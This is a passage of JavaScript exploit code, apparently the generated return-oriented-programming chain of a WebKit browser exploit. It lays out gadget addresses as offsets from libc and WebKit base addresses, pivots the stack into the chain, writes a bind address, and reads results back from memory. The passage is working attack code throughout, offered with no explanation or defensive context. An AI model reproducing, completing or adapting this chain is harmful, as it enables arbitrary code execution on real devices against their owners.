db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+772328, //pop rcx
bind_addr,
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+224608, //L3489
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L3489:
db([0, 0]); // 0x0
//L2640:
db([2, 0, 0, 0, 0, 0]);
pivot(ropchain);
var main_ret = read_ptr_at(main_ret);
var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
